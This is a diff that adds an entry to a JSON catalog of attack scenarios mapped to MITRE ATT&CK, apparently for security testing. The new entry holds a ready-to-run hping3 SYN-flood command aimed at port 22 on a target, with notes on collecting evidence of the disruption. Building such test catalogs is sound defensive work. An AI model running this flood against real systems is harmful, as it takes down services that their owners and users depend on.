@@ -222,6 +222,19 @@
     "attack_ics_name": "Denial of Service",
     "atomic_red_team_status": "confirmed_procedure_example_on_mitre_page"
   },
+  "dos_syn-flood-port-22": {
+    "label2": "dos",
+    "label3": "syn-flood-port-22",
+    "tool": "hping3",
+    "cmd": "hping3 -S -p 22 --flood -V {target}",
+    "requires_root": true,
+    "notes": "Port 22 is normally the attacker's own SSH control channel to the target, so this run can disrupt your own monitoring session as well as the target's SSH service -- that disruption is itself valid evidence of effect, not a bug. Capture target-side evidence (vmstat, ss) via a process started with nohup/disown BEFORE this scenario runs, since an in-band SSH session may drop.",
+    "attack_enterprise_id": "T1498.001",
+    "attack_enterprise_name": "Network Denial of Service: Direct Network Flood",
+    "attack_ics_id": "T0814",
+    "attack_ics_name": "Denial of Service",
+    "atomic_red_team_status": "confirmed_procedure_example_on_mitre_page"
+  },
   "dos_connect-flood": {
     "label2": "dos",
     "label3": "connect-flood",
